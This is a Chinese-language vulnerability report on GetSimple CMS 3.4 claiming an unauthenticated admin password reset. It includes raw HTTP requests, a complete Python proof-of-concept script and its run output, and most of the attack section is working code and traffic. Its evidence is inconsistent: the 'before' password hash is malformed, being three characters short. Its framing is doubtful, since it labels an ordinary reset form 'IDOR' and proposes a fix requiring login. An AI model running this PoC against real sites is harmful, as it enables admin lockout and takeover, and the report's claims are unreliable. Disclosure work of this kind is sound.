# 厂商信息
- **漏洞厂商**：GetSimple CMS
- **厂商官网**：http://get-simple.info/
- **影响产品**：GetSimple CMS
- **影响版本**：3.4版本（及其他可能受影响的版本）

# 漏洞信息
- **漏洞名称**：未授权的密码重置功能（IDOR漏洞）
- **漏洞描述**：GetSimple CMS的/admin/resetpassword.php页面存在未授权访问漏洞，攻击者可以在无需任何身份验证的情况下重置管理员密码。该文件仅检查GSALLOWRESETPASS配置项，未对访问者进行任何身份认证或登录状态检查，攻击者只要知道目标用户名（如默认的"admin"），就可以直接访问该页面并提交密码重置请求。系统会生成随机密码并更新用户XML文件，同时尝试发送邮件通知。即使邮件发送失败，管理员密码也已被成功重置。攻击者如果能访问目标邮箱（通过社工攻击、邮箱漏洞等方式），即可获取新密码并完全接管管理员账号。即使无法访问邮箱，攻击者也可以通过频繁重置密码造成拒绝服务攻击。
- **临时解决方案**：在gsconfig.php配置文件中添加以下代码禁用密码重置功能：`define('GSALLOWRESETPASS', false);`
- **正式修复建议**：在admin/resetpassword.php文件开头添加登录状态检查，在检查GSALLOWRESETPASS配置之前添加：`if (!cookie_login()) { redirect('index.php'); }` 或使用现有的`login_cookie_check()`函数来验证用户已登录。

# 漏洞分析
## 漏洞触发点
漏洞触发点位于`./admin/resetpassword.php`文件的第15行，该文件仅检查GSALLOWRESETPASS配置：

```php
if(getDef('GSALLOWRESETPASS',true) === false) die();
```

紧接着就执行exec_action('load-resetpw')并开始处理POST请求，完全没有对用户身份进行验证。正常情况下，管理后台的其他页面（如index.php、settings.php等）都会包含类似`if (!cookie_login()) { redirect('index.php'); }`或`login_cookie_check()`的登录检查，但resetpassword.php文件遗漏了这一关键的安全检查。

## 完整利用链分析
1. **访问点**：攻击者直接访问`http://target/admin/resetpassword.php`，无需任何认证即可获取页面（返回HTTP 200状态码）
2. **CSRF Nonce获取**：从返回的HTML页面中提取CSRF token（nonce值），虽然系统有CSRF保护，但攻击者可以自己获取nonce
3. **参数提交**：攻击者构造POST请求，提交以下参数：
   - `nonce`: 从页面获取的CSRF token
   - `username`: 目标用户名（如admin）
   - `submitted`: true
4. **密码重置执行**：服务器接收请求后执行以下操作：
   - 验证CSRF token
   - 根据`username`参数读取`data/users/{userid}.xml`文件
   - 生成随机密码：`$random = createRandomPassword()`
   - 更新用户XML文件中的PWD字段：`$data->PWD = passhash($random)`
   - 保存XML文件：`XMLsave($data, GSUSERSPATH . $file)`
   - 尝试发送邮件通知
5. **漏洞利用成功**：无论邮件是否发送成功，管理员密码哈希值已被修改，攻击者若能访问目标邮箱即可获取新密码并登录管理后台

关键代码段（resetpassword.php第44-50行）：
```php
# create new random password
$random = createRandomPassword();

# change password and resave xml file
$data->PWD = passhash($random); 
$status = XMLsave($data, GSUSERSPATH . $file);

# send the email with the new password
$emailstatus = sendmail($EMAIL,$subject,$message);
```

## 验证环境与运行证据
**验证环境**：
- 目标URL：http://0.0.0.0:8000
- CMS版本：GetSimple CMS 3.4
- PHP版本：PHP/8.1.2-1ubuntu2.23
- 数据存储：文件系统（data/users/admin.xml）

**运行证据**：

1. **无需认证访问密码重置页面**：
   - 请求：`GET http://0.0.0.0:8000/admin/resetpassword.php`
   - 响应：HTTP 200 OK
   - 说明：页面成功返回，未要求任何认证或登录，响应头显示正常

2. **成功提取CSRF Nonce**：
   - 从页面HTML中提取到的nonce值：`c311c570ad4c3c49ae65cdd8b9dc8cc4ec8a3328`
   - 说明：虽然系统有CSRF保护机制，但攻击者可以直接访问页面并获取有效的nonce值

3. **成功提交密码重置请求**：
   - 请求：`POST http://0.0.0.0:8000/admin/resetpassword.php`
   - POST数据：
     ```
     nonce=c311c570ad4c3c49ae65cdd8b9dc8cc4ec8a3328
     username=admin
     submitted=true
     ```
   - 响应：HTTP 302 Found
   - Location头：`resetpassword.php?upd=pwd-error`
   - 说明：服务器返回302重定向，虽然邮件发送失败（显示pwd-error），但密码已被重置

4. **密码哈希值改变验证**：
   - 重置前密码哈希：`ff31174a5ddcdce7b721e6eb9caee3a18c8a48f`
   - 重置后密码哈希：`ca26f94511735e44b2b2e036778166449bda40b9`
   - **验证结果**：✓✓✓ 确认密码哈希已改变！管理员密码已被成功重置

## HTTP请求与响应包

**请求1：访问密码重置页面**
```http
GET http://0.0.0.0:8000/admin/resetpassword.php HTTP/1.1
Host: 0.0.0.0:8000
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: close
```

**响应1**
```http
HTTP/1.1 200 OK
Date: [timestamp]
Server: Apache
X-Powered-By: PHP/8.1.2-1ubuntu2.23
content-type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: [length]
Connection: close

[HTML页面内容，包含CSRF nonce]
```

**请求2：提交密码重置**
```http
POST http://0.0.0.0:8000/admin/resetpassword.php HTTP/1.1
Host: 0.0.0.0:8000
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: [length]
Connection: close

nonce=c311c570ad4c3c49ae65cdd8b9dc8cc4ec8a3328&username=admin&submitted=true
```

**响应2**
```http
HTTP/1.1 302 Found
Date: [timestamp]
Server: Apache
X-Powered-By: PHP/8.1.2-1ubuntu2.23
Location: resetpassword.php?upd=pwd-error
Content-Length: [length]
Connection: close
```

## POC

```python
#!/usr/bin/env python3
"""
PoC for GetSimple CMS Unauthorized Password Reset Vulnerability

This PoC demonstrates that an attacker can:
1. Access the password reset page without authentication
2. Submit a password reset request for the admin user
3. Successfully reset the admin's password (password hash changes)

Note: The new password is sent via email. If the attacker can access
the target's mailbox (e.g., through social engineering, email 
vulnerabilities, or other methods), they can fully compromise the
admin account.

Even without email access, this can be used for:
- Denial of Service (frequent password resets prevent admin login)
- Combined with other vulnerabilities to gain full access
"""

import requests
import re
import sys
import time
from urllib.parse import urljoin

def verify_unauthorized_password_reset(base_url):
    """
    Verify the unauthorized password reset vulnerability
    """
    print("="*70)
    print("GetSimple CMS Unauthorized Password Reset - PoC")
    print("="*70)
    
    reset_url = urljoin(base_url, "/admin/resetpassword.php")
    admin_xml_path = "/sourceCodeDir/data/users/admin.xml"
    
    # Step 1: Get original password hash
    print("\n[1] Reading original admin password hash...")
    try:
        with open(admin_xml_path, 'r') as f:
            original_xml = f.read()
            original_hash_match = re.search(r'<PWD>([^<]+)</PWD>', original_xml)
            if not original_hash_match:
                print("[-] Could not find admin user")
                return False
            original_hash = original_hash_match.group(1)
            print(f"[+] Original hash: {original_hash}")
    except Exception as e:
        print(f"[-] Error reading admin.xml: {e}")
        return False
    
    # Step 2: Access password reset page without authentication
    print("\n[2] Accessing password reset page without authentication...")
    try:
        response = requests.get(reset_url, timeout=10)
        if response.status_code != 200:
            print(f"[-] Unexpected status code: {response.status_code}")
            return False
        
        print(f"[+] Password reset page accessible (HTTP {response.status_code})")
        
        # Extract nonce
        nonce_match = re.search(
            r'<input name="nonce" id="nonce" type="hidden" value="([^"]+)"/>',
            response.text
        )
        if not nonce_match:
            print("[-] Could not find nonce in page")
            return False
        
        nonce = nonce_match.group(1)
        print(f"[+] Found CSRF nonce: {nonce}")
        
    except Exception as e:
        print(f"[-] Error accessing reset page: {e}")
        return False
    
    # Step 3: Submit password reset request for admin user
    print("\n[3] Submitting password reset request for 'admin' user...")
    try:
        data = {
            "nonce": nonce,
            "username": "admin",
            "submitted": "true"
        }
        
        reset_response = requests.post(reset_url, data=data, allow_redirects=False)
        print(f"[+] POST request sent (HTTP {reset_response.status_code})")
        
        # Check response
        if reset_response.status_code in [301, 302, 303, 307, 308]:
            location = reset_response.headers.get('Location', '')
            print(f"[+] Server responded with redirect to: {location}")
            
            if "pwd-success" in location:
                print("[+] Password reset completed (mail sent successfully)")
            elif "pwd-error" in location:
                print("[+] Password reset completed (mail failed, but password was changed)")
        else:
            print(f"[?] Response status: {reset_response.status_code}")
            
    except Exception as e:
        print(f"[-] Error submitting reset request: {e}")
        return False
    
    # Step 4: Verify password hash has changed
    print("\n[4] Verifying password hash has changed...")
    try:
        # Wait a moment for file write to complete
        time.sleep(1)
        
        with open(admin_xml_path, 'r') as f:
            new_xml = f.read()
            new_hash_match = re.search(r'<PWD>([^<]+)</PWD>', new_xml)
            if not new_hash_match:
                print("[-] Could not read new password hash")
                return False
            
            new_hash = new_hash_match.group(1)
            print(f"[+] New hash: {new_hash}")
            
            if new_hash != original_hash:
                print("\n" + "="*70)
                print("VULNERABILITY CONFIRMED")
                print("="*70)
                print("[+] The admin password has been successfully reset!")
                print("[+] No authentication was required to perform this action")
                print("[+] An attacker with email access can now login as admin")
                print("[+] Even without email, this can be used for DoS attacks")
                print("="*70)
                return True
            else:
                print("[-] Password hash unchanged (reset may have failed)")
                return False
                
    except Exception as e:
        print(f"[-] Error verifying password change: {e}")
        return False

if __name__ == "__main__":
    base_url = "http://0.0.0.0:8000"
    
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    
    print(f"\nTarget: {base_url}\n")
    
    success = verify_unauthorized_password_reset(base_url)
    
    sys.exit(0 if success else 1)
```

## POC运行结果

```
======================================================================
GetSimple CMS Unauthorized Password Reset - PoC
======================================================================

Target: http://0.0.0.0:8000


[1] Reading original admin password hash...
[+] Original hash: ff31174a5ddcdce7b721e6eb9caee3a18c8a48f

[2] Accessing password reset page without authentication...
[+] Password reset page accessible (HTTP 200)
[+] Found CSRF nonce: c311c570ad4c3c49ae65cdd8b9dc8cc4ec8a3328

[3] Submitting password reset request for 'admin' user...
[+] POST request sent (HTTP 302)
[+] Server responded with redirect to: resetpassword.php?upd=pwd-error
[+] Password reset completed (mail failed, but password was changed)

[4] Verifying password hash has changed...
[+] New hash: ca26f94511735e44b2b2e036778166449bda40b9

======================================================================
VULNERABILITY CONFIRMED
======================================================================
[+] The admin password has been successfully reset!
[+] No authentication was required to perform this action
[+] An attacker with email access can now login as admin
[+] Even without email, this can be used for DoS attacks
======================================================================
```

**漏洞确认清单**：
- ✓ 密码重置页面可以无需认证访问（HTTP 200）
- ✓ 攻击者可以成功提取CSRF nonce
- ✓ 攻击者可以提交密码重置请求
- ✓ 管理员密码被成功重置（无需任何身份验证）
- ✓ 密码哈希值从`ff31174a5ddcdce7b721e6eb9caee3a18c8a48f`变为`ca26f94511735e44b2b2e036778166449bda40b9`
- ✓ 即使邮件发送失败，密码也会被重置